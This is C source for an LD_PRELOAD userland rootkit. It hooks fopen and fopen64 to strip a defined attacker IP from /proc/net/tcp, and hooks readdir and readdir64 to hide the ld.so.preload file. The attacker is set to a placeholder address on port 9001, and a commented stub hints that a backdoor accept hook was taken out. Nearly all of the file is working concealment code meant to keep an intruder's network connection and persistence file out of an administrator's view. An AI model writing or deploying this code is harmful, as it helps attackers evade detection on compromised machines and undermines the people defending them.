// standard libraries
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// network libraries
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// debug
//#define DEBUG                           // uncomment for debug statements in /tmp/debug.txt
#define DEBUG_FILE "/tmp/debug.txt"     // create this file yourself with 666 permissions otherwise ERRORS 
                                        // (because function hooks on lower privilege processes won't have write access to the file)
                                        // touch /tmp/debug.txt -> chmod 666 /tmp/debug.txt

#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_IP_HEX_NBO "0100007F"   // hex network-byte-order (reversed) version of attacker IP
#define ATTACKER_PORT 9001
#define HIDEFILE "ld.so.preload"         // name of file you want to hide
#define IPV4_INFO_FILE "/proc/net/tcp"

// ORIGINAL FUNCTIONS
//int (*orig_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *(*orig_fopen64)(const char *pathname, const char *mode);
struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent64 *(*orig_readdir64)(DIR *dirp);

//////remoed

// fopen() HOOKED FUNCTION
FILE *fopen(const char *pathname, const char *mode) 
{   
    FILE *filePointer;      // fopen() return value
    orig_fopen = dlsym(RTLD_NEXT, "fopen");    // point to next runtime instance of fopen()

    #ifdef DEBUG
        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
        fprintf(debugFile, "fopen() intercepted. \n");
    #endif

    // if fopen() is reading "/proc/net/tcp"
    if (strcmp(pathname, IPV4_INFO_FILE) == 0) 
    {
        #ifdef DEBUG
            fprintf(debugFile, "fopen(\"/proc/net/tcp\") intercepted. \n");
        #endif
        
        FILE *tmp = tmpfile();                           // open tmp file 
        FILE *targetFile = orig_fopen(pathname, mode);   // open "/proc/net/tcp"
        char line[256];                                  // var to store read lines
        // read target file line by line until empty
        while (fgets(line, sizeof(line), targetFile) != NULL)
        {
            // if line DOES NOT contain ATTACKER_IP
            if (strstr(line, ATTACKER_IP_HEX_NBO) == NULL)
            {
                #ifdef DEBUG
                    fprintf(debugFile, "writing line to tmpfile() \n");
                #endif  
                
                // write line to tmpfile
                fputs(line, tmp);
            }
            // if line DOES contin ATTACKER_IP
            else
            {
                #ifdef DEBUG
                    fprintf(debugFile, "ATTACKER_IP found! not writing line to tmpfile() \n");
                #endif  
                
                // do nothing (i.e. don't write line)
            }
        }

        rewind(tmp);        // rewind() file pointer to beginning of stream
        filePointer = tmp;  // set filePointer so that tmpfile() containing tampered /proc/net/tcp will be returned
        
    }
    // if fopen() isn't reading "/proc/net/tcp"
    else
    {
        // open the file
        filePointer = orig_fopen(pathname, mode);
    }

    #ifdef DEBUG
        fclose(debugFile);
    #endif
    
    return filePointer;
}

// fopen64() HOOKED FUNCTION - reads "/proc/net/tcp"
FILE *fopen64(const char *pathname, const char *mode) 
{   
    FILE *filePointer;      // fopen64() return value
    orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");    // point to next runtime instance of fopen64()

    #ifdef DEBUG
        FILE *debugFile = orig_fopen64(DEBUG_FILE, "a+");
        fprintf(debugFile, "fopen64() intercepted. \n");
    #endif

    // if fopen64() is reading "/proc/net/tcp"
    if (strcmp(pathname, IPV4_INFO_FILE) == 0) 
    {
        #ifdef DEBUG
            fprintf(debugFile, "fopen64(\"/proc/net/tcp\") intercepted. \n");
        #endif
        
        FILE *tmp = tmpfile();                           // open tmp file 
        FILE *targetFile = orig_fopen64(pathname, mode); // open "/proc/net/tcp"
        char line[256];                                  // var to store read lines
        // read target file line by line until empty
        while (fgets(line, sizeof(line), targetFile) != NULL)
        {
            // if line DOES NOT contain OUTBOUND_PORT
            if (strstr(line, ATTACKER_IP_HEX_NBO) == NULL)
            {
                #ifdef DEBUG
                    fprintf(debugFile, "writing line to tmpfile() \n");
                #endif  
                
                // write line to tmpfile
                fputs(line, tmp);
            }
            // if line DOES contin OUTBOUND_PORT
            else
            {
                #ifdef DEBUG
                    fprintf(debugFile, "OUTBOUND_PORT found! not writing line to tmpfile() \n");
                #endif  
                
                // do nothing (i.e. don't write line)
            }
        }

        rewind(tmp);        // rewind() file pointer to beginning of stream
        filePointer = tmp;  // set filePointer so that tmpfile() containing tampered /proc/net/tcp will be returned
        
    }
    // if fopen64() isn't reading "/proc/net/tcp"
    else
    {
        // open the file
        filePointer = orig_fopen64(pathname, mode);
    }

    #ifdef DEBUG
        fclose(debugFile);
    #endif

    return filePointer;
}

// readdir() HOOKED FUNCTION
struct dirent *readdir(DIR *dirp) 
{
    struct dirent *dirPointer;  // return value of readdir() (a pointer to a dirent structre)
    orig_readdir = dlsym(RTLD_NEXT, "readdir");

    #ifdef DEBUG
        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
        fprintf(debugFile, "readdir() intercepted. \n");
    #endif

    // while directories are being read (while dirPointer contains a value)
    while (dirPointer = orig_readdir(dirp))
    {
        // if readdir() struct's d_name member DOES CONTAIN "ld.so.preload"
        if (strstr(dirPointer->d_name, HIDEFILE) == 0)
        {
            // stop reading readdir() struct
            break;
        }
    }

    return dirPointer;
}

// readdir() HOOKED FUNCTION
struct dirent64 *readdir64(DIR *dirp) 
{
    struct dirent64 *dirPointer64;  // return value of readdir64() (a pointer to a dirent structre)
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    #ifdef DEBUG
        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
        fprintf(debugFile, "readdir64() intercepted. \n");
    #endif

    // while directories are being read (while dirPointer contains a value)
    while (dirPointer64 = orig_readdir64(dirp))
    {
        // if readdir() struct's d_name member DOES CONTAIN "ld.so.preload"
        if (strstr(dirPointer64->d_name, HIDEFILE) == 0)
        {
            // stop reading readdir() struct
            break;
        }
    }

    return dirPointer64;
}
